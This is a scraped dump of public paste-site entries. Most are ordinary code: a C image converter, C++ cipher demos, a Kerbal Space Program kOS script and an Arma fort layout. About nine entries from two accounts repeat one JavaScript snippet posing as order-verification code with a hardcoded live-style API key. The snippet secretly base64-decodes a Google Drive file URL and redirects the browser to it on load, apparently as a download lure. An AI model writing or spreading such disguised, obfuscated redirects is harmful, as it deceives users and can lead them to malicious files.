    BGR **scaled_data = transform(luminance, blue, red, height, width, stride, gray_scale, up_size, down_size);
    printf(""data transformed\n"");
    for (int i = 0; i < new_height; i++) {
        fwrite(scaled_data[i], sizeof(BGR), new_width, out); // error
        int row_size = (3 * new_width + 3) & ~3;
        fwrite(""\0"", 1, row_size - 3 * new_width, out); // error
    }

    free(data);
    free(scaled_data);
}


char *is_argkey(char *arg) {
    if (strlen(arg) <= 2) {
        return NULL;
    }
    if (arg[0] == '-' && arg[1] == '-') {
        return arg + 2;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    // printf(""amount of arguments %d \n"", argc);
    char *input_file_name;
    char *output_file_name;
    int width;
    int height;
    int is_gray_scale = 0; // 1 - if grayscale, 0 - if not
    int up_size = 1, down_size = 1;
    for (int i = 1; i < argc; i++) {
        char *key = is_argkey(argv[i]);
        if (key == NULL) {
            printf(""No valid argument for command line %s \n"", argv[i]);
            return 1;
        }
        if (strcmp(key, ""input"") == 0) {
            input_file_name = argv[++i];
        } else if (strcmp(key, ""output"") == 0) { // ++i есть?
            output_file_name = argv[++i];
        } else if (strcmp(key, ""width"") == 0) {
            width = atoi(argv[++i]);
        } else if (strcmp(key, ""height"") == 0) {
            height = atoi(argv[++i]);
        } else if (strcmp(key, ""to–gray–scale"") == 0) {
            is_gray_scale = 1;
        } else if (strcmp(key, ""up-size"") == 0) {
            up_size = atoi(argv[++i]);
        } else if (strcmp(key, ""down-size"") == 0) {
            down_size = atoi(argv[++i]);
        } else {
            printf(""key is not find %s \n"", key);
            return 1;
        }
    }

    if (width <= 0 || height <= 0 || up_size <= 0 || down_size <= 0) {
        perror(""Can't get minus arguments.\n"");
        return 1;
    }

    FILE *in = fopen(input_file_name, ""rb"");
    if (!in) {
        perror(""Error opening input file"");
        return 1;
    }

    FILE *out = fopen(output_file_name, ""wb"");
    if (!out) {
        perror(""Error opening output file"");
        fclose(in);
        return 1;
    }


    YUV2BMP(in, out, height, width, 2, is_gray_scale, up_size, down_size);

    fclose(in);
    fclose(out);
}
"
FbMQuU6Z,Untitled,jm33,JavaScript,Saturday 5th of April 2025 04:25:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53591/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AFGfHRS4,Products.js,jm33,JavaScript,Saturday 5th of April 2025 04:10:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39996/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
969rAVBM,Order.js,jm33,JavaScript,Saturday 5th of April 2025 03:54:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9brHwhvv,2,EtiennePHILIPPE,JSON,Saturday 5th of April 2025 03:51:59 PM CDT,"{""name"": ""microsd>usb"", ""support"": ""adaptateur"", ""female"": ""sd microsd"", ""male"": ""usb"", ""creator"": ""Etienne"", ""id"": ""2""}"
5M8fVPCF,VerticalPermutation,rgoerv,C++,Saturday 5th of April 2025 03:40:26 PM CDT,"#include <iostream>
#include <string>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <unordered_map>
#include <cmath>

using namespace std::string_literals;

std::string VerticalPermutationENcode(const std::vector<int>& Key, const std::string& StrForENcoding)
{
    std::unordered_map<int, std::string> ENCodeTable;

    const std::vector<int> sortedKey = ([&Key]() {
        std::vector<int> SortedKeyBuf(Key);
        std::sort(SortedKeyBuf.begin(), SortedKeyBuf.end());
        return SortedKeyBuf;
    })();

    size_t TableLen = Key.size();
    size_t keyIdx = 0;

    for(const int& key_part : sortedKey) {
        std::string vertical;
        for(size_t idx = keyIdx; idx < StrForENcoding.length(); idx += TableLen)
        {
            vertical.push_back(StrForENcoding[idx]);
        }
        ENCodeTable[key_part] = vertical;
        ++keyIdx;
    }
    std::string ENCodedStr;
    for(const int& key_part : Key) {
        ENCodedStr.append(ENCodeTable[key_part]);
    }
    return ENCodedStr;
}

static std::string VerticalPermutationDEcode(const std::vector<int>& Key, const std::string& StrForDEcoding)
{
    const size_t str_size = StrForDEcoding.size();
    const size_t TableLen = Key.size();
    const size_t ver_max_size = ceil((double)str_size / (double)TableLen);
    const size_t ver_res = (str_size % TableLen);

    const std::vector<int> sortedKey =  ([&Key]() {
        std::vector<int> SortedKeyBuf(Key);
        std::sort(SortedKeyBuf.begin(), SortedKeyBuf.end());
        return SortedKeyBuf;
    })();

    std::unordered_map<int, std::string> SortedKeyToStrForDecode;

    size_t len = 0;
    size_t curr_len = ver_max_size;

    for(size_t i = 0; i < TableLen; ++i, len += curr_len) {
        curr_len = Key[i] <= ver_res ? ver_max_size : ver_max_size - 1;
        SortedKeyToStrForDecode[Key[i]] = StrForDEcoding.substr(len, curr_len);
    }

    std::vector<std::string> strkey;
    std::string decoded_str = """"s;

    for(const auto& key : sortedKey) {
        strkey.push_back(SortedKeyToStrForDecode[key]);
    }

    for(size_t i = 0; i < ver_max_size; ++i) {
        for(auto& str : strkey) {   
            decoded_str.push_back(str[i]);
        }
    }
    return decoded_str;
}

int main()
{
    setlocale(LC_ALL, """");

    static std::string str_for_encoding = ""Пример работы шифра вертикальной перестановки""s;
    std::vector<int> key = { 3, 1, 4, 5, 2 };

    std::cout << str_for_encoding << std::endl;
    std::string encoded_str = VerticalPermutationENcode(key, str_for_encoding);
    std::cout << encoded_str << std::endl
    << VerticalPermutationDEcode(key, encoded_str) << std::endl;
}"
WV7S0iBD,Market.js,jm33,JavaScript,Saturday 5th of April 2025 03:39:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10736/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G7AtsVbr,Untitled,jm33,JavaScript,Saturday 5th of April 2025 03:23:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tE4DeDwq,TPKSP Warp Utilities Fork,kane1941,Rust,Saturday 5th of April 2025 03:15:53 PM CDT,"set warputil to true. // killswitch for all triggers

// -------

// utility functions
function engage {
	parameter amount is 1.
	set ship:control:pilotmainthrottle to 0.25 + amount * 0.75.
}

function disengage {
	set ship:control:pilotmainthrottle to 0.
}

function gravitybrake { 
	parameter f is 0.5.
	warpdrive off.
	set warp to 1.
	wait until kuniverse:timewarp:issettled.
	warpto(time:seconds + eta:transition * f).
}

// enable supercharging
for a in ship:modulesnamed(""wbiwarpengine"") if a:hasfield(""supercharger"") a:setfield(""supercharger"",200).
aux on.
// pseudo-actiongroups
warpdrive off. on warpdrive {
	if not warputil return warputil.
	set any to false.
	for m in ship:modulesnamed(""wbimodulegeneratorfx"") {		
		if aux {		
			set eventName to choose ""Activate Auxilary Power"" if warpdrive else ""Deactivate Auxilary Power"".
			if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
		}
		else {
			print(""Auxilary was not activated!""). 
		}
		
		set eventName to choose ""Activate Main Power"" if warpdrive else ""Deactivate Main Power"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}

	for m in ship:modulesnamed(""wbiwarpengine"") {
		set eventName to choose ""Activate Engine"" if warpdrive else ""Shutdown Engine"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}
	if not any {
		print ""WARNING: no warpdrives altered"".
	}
	
	return warputil.
}

reactors off. on reactors {
	if not warputil return warputil.
	set any to false.
	for m in ship:modulesnamed(""wbimodulegeneratorfx"") {
		set eventName to choose ""Activate Fusion Power"" if reactors else ""Deactivate Fusion Power"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}
	if not any {
		print ""WARNING: no reactors altered"".
	}

	return warpUtil.
}

// gui

set warpfields to list(
	""max warp speed"",
	""warp speed"",
	""prop. requirement met"",
	""ftl check"",
	""course"",
	""distance"",
	""status"",
	""cause"",
	""minimum warp altitude"",
	""spatial location"").

set res to gui(200, 100). 
Set res:x to -40. set res:y to 5. 
res:show. 
set reslist to list(). 
for i in range(ship:resources:length + warpfields:length) { 
	set l to res:addlabel(). 
	Set l:style:fontsize to 13. reslist:add(l). 
}

on time:second { 
	set i to 0. 
	for rs in ship:resources { 
		set reslist[i]:text to rs:name + "" "" + round(rs:amount,1) + "" / "" + rs:capacity. 
		set reslist[i]:style:textcolor to rgb(1 - rs:amount/rs:capacity,rs:amount/rs:capacity,0.3). 
		set i to i + 1. 
	}
	set warpengines to ship:modulesnamed(""wbiwarpengine"").
	set last to warpengines:length-1.
	set i to 0. if warpengines:length > 0 for f in warpfields {
		set label to reslist[ship:resources:length + i].
		set label:visible to warpengines[0]:hasfield(f).
		if (label:visible) {
			set label:text to f + "": "" + warpengines[last]:getfield(f).
		}
		set i to i + 1.
	}

	return res:visible. 
}

// clearscreen. 
print ""action groups: warpdrive, reactors"".
print ""functions: engage, disengage"".
print ""warputil off to cancel"".

on warputil { set res:visible to false. }
"
JY6nw29W,Products.js,WantingTrae,JavaScript,Saturday 5th of April 2025 03:07:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68423/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5C3yZTv3,Order.js,WantingTrae,JavaScript,Saturday 5th of April 2025 02:52:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iC1HVXuJ,ReplacementCipher,rgoerv,C++,Saturday 5th of April 2025 02:45:04 PM CDT,"#include <iostream>
#include <string>
#include <algorithm>
#include <cstdint>

using namespace std;

static string alphabet = "" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz""s;

static string ReplacementCipherENcode(const string& Slogan, const string& Alphabet, 
    const string StrForENcoding)
{
    string encoding_alphabet(Alphabet);
    for_each(Slogan.begin(), Slogan.end(), [&encoding_alphabet](const auto& symbol) {                                                   
        remove(encoding_alphabet.begin(), encoding_alphabet.end(), symbol);
    });
    rotate(encoding_alphabet.rbegin(), encoding_alphabet.rbegin() + Slogan.length(), 
                                                            encoding_alphabet.rend());
    encoding_alphabet.replace(0, Slogan.length(), Slogan);

    string ENcoded_str;
    for(const auto& symbol: StrForENcoding)
    {
        ENcoded_str.push_back(encoding_alphabet[Alphabet.find(symbol)]);
    }
    return ENcoded_str;
}

static string ReplacementCipherDEcode(const string& Slogan, const string& Alphabet, 
    const string StrForDEcoding)
{
    string encoding_alphabet(Alphabet);
    for_each(Slogan.begin(), Slogan.end(), [&encoding_alphabet](const auto& symbol) {                                                   
        remove(encoding_alphabet.begin(), encoding_alphabet.end(), symbol);
    });
    rotate(encoding_alphabet.rbegin(), encoding_alphabet.rbegin() + Slogan.length(), 
                                                            encoding_alphabet.rend());
    encoding_alphabet.replace(0, Slogan.length(), Slogan);

    string DEcoded_str;
    for(const auto& symbol: StrForDEcoding)
    {
        DEcoded_str.push_back(Alphabet[encoding_alphabet.find(symbol)]);
    }
    return DEcoded_str;
}

int main()
{
    static string str_for_encoding = ""CRYPTOGRaPHY EXAMpLE TEmPlATe""s;
    cout << ""Строка для кодирования: "" << str_for_encoding << endl;    

    static string slogan = ""CRYPTO""s;
    cout << ""Ключ\\слоган "" << slogan << endl;

    const string ENCodedStrR(ReplacementCipherENcode(slogan, alphabet, 
        str_for_encoding));
    cout << ""Зашифрованная строка: "" << ENCodedStrR << endl;
    cout << ""Дешифрованная строка: "" << ReplacementCipherDEcode(slogan, alphabet, 
        ENCodedStrR) << endl;
}"
FkEBc7rA,Market.js,WantingTrae,JavaScript,Saturday 5th of April 2025 02:36:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50773/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6kdeGscK,StarFort.sqf,milorules1012,SQF,Saturday 5th of April 2025 02:32:17 PM CDT,"_object0 = createVehicle [""Land_Pier_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object0 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object0 setPosASL [-9998.91,-9996.7,-1.0028];


_object1 = createVehicle [""Sign_Arrow_Yellow_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object1 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object1 setPosASL [0.46875,0.46875,-185.97];


_object2 = createVehicle [""Sign_Arrow_Green_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object2 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object2 setPosASL [0.46875,0.46875,-185.97];


_object3 = createVehicle [""Sign_Arrow_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object3 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object3 setPosASL [0.46875,0.46875,-185.97];


_object4 = createVehicle [""babe_helper"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object4 setVectorDirAndUp [[0,1,0],[-0,-0,1]];
_object4 setPosASL [0,0,0.0741826];


_object5 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object5 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object5 setPosASL [14875.6,20362.6,39.375];


_object6 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object6 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object6 setPosASL [14868.4,20428.5,39.6525];


_object7 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object7 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object7 setPosASL [14876.8,20429.9,39.6455];


_object8 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object8 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object8 setPosASL [14868.1,20434.9,39.6295];


_object9 = createVehicle [""land_3as_cis_wall_short_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object9 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object9 setPosASL [14869,20435.1,39.6296];


_object10 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object10 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object10 setPosASL [14854.9,20439.4,39.625];


_object11 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object11 setVectorDirAndUp [[0.965926,0.258819,0],[0,0,1]];
_object11 setPosASL [14856.5,20439.6,39.625];


_object12 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object12 setVectorDirAndUp [[0.258819,-0.965926,0],[0,0,1]];
_object12 setPosASL [14867.4,20459.1,39.5];


_object13 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object13 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object13 setPosASL [14860.1,20450.6,39.625];


_object14 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object14 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object14 setPosASL [14867.3,20460.6,39.5903];


_object15 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object15 setVectorDirAndUp [[0.866025,-0.500001,0],[0,0,1]];
_object15 setPosASL [14894.4,20298.3,36.625];


_object16 = createVehicle [""land_3as_cis_wall_tower_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object16 setVectorDirAndUp [[0.965926,0.258819,0],[0,0,1]];
_object16 setPosASL [14896,20298.5,36.625];


_object17 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object17 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object17 setPosASL [14904.3,20291.1,36.875];


_object18 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object18 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object18 setPosASL [14900.5,20313.9,36.625];


_object19 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object19 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object19 setPosASL [14896.6,20350.3,39.375];


_object20 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object20 setVectorDirAndUp [[-0.866025,0.5,0],[0,0,1]];
_object20 setPosASL [14905,20359.5,39.375];


_object21 = createVehicle [""land_3as_cis_wall_bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object21 setVectorDirAndUp [[0.5,0.866025,0],[0,0,1]];
_object21 setPosASL [14885.5,20355.5,39.375];


_object22 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object22 setVectorDirAndUp [[-0.965661,-0.258552,-0.0254969],[-0.0253251,-0.00399538,0.999671]];
_object22 setPosASL [14890.5,20357.3,36.0049];


_object23 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object23 setVectorDirAndUp [[0.864414,0.494876,0.0888019],[-0.086343,-0.0278848,0.995875]];
_object23 setPosASL [14881.3,20363,35.4192];


_object24 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object24 setVectorDirAndUp [[0,0.999608,0.0279894],[-0.086343,-0.0278848,0.995875]];
_object24 setPosASL [14880.1,20362.8,35.318];


_object25 = createVehicle [""3as_small_crate_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object25 setVectorDirAndUp [[-0.704792,0.708212,-0.0412757],[-0.086343,-0.0278848,0.995875]];
_object25 setPosASL [14880.1,20363.9,35.347];


_object26 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object26 setVectorDirAndUp [[-0.500001,-0.866025,0],[0,0,1]];
_object26 setPosASL [14893,20392.4,39.375];


_object27 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object27 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object27 setPosASL [14882.1,20378.9,39.375];


_object28 = createVehicle [""land_3as_cis_wall_inv_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object28 setVectorDirAndUp [[0.866025,-0.5,0],[0,0,1]];
_object28 setPosASL [14904.5,20391.4,39.375];


_object29 = createVehicle [""land_3as_cis_ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object29 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object29 setPosASL [14892.4,20384.1,39.125];


_object30 = createVehicle [""3as_large_crate_stack_3_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object30 setVectorDirAndUp [[0,0.999892,0.0146639],[0.0213271,-0.0146606,0.999665]];
_object30 setPosASL [14907.8,20382.8,36.6134];


_object31 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object31 setVectorDirAndUp [[0.500001,0.866025,0],[0,0,1]];
_object31 setPosASL [14884.3,20422.4,39.687];


_object32 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object32 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object32 setPosASL [14906.8,20423.4,38.1307];


_object33 = createVehicle [""3as_ModularPlatform_BridgeSegment_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object33 setVectorDirAndUp [[0.599111,1.03974,0],[0,0,1.2]];
_object33 setPosASL [14898.5,20428.1,38.1307];


_object34 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object34 setVectorDirAndUp [[-0.51209,-0.858932,0],[0,0,1]];
_object34 setPosASL [14907.3,20423,39.2342];


_object35 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object35 setVectorDirAndUp [[0.51209,0.858932,0],[0,0,1]];
_object35 setPosASL [14906.1,20423.6,39.25];


_object36 = createVehicle [""3as_Backless_Mortar_Pit_Trench"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object36 setVectorDirAndUp [[0.258673,-0.965841,0.0154978],[0.0346456,0.0253099,0.999079]];
_object36 setPosASL [14888.3,20406.8,36.7246];


_object37 = createVehicle [""land_3as_cis_wall_corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object37 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object37 setPosASL [14896.6,20443.5,39.6218];


_object38 = createVehicle [""land_3as_cis_wall_long_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object38 setVectorDirAndUp [[-0.5,-0.866025,0],[0,0,1]];
_object38 setPosASL [14883.3,20454.3,39.6465];


_object39 = createVehicle [""land_3as_cis_wall_med_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object39 setVectorDirAndUp [[-0.866025,0.500001,0],[0,0,1]];
_object39 setPosASL [14892.6,20431.6,39.625];


_object40 = createVehicle [""3as_ModularPlatform_Straight_CIS"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object40 setVectorDirAndUp [[-0.498982,-0.866613,0],[0,0,1]];
_object40 setPosASL [14895.6,20430,39.375];


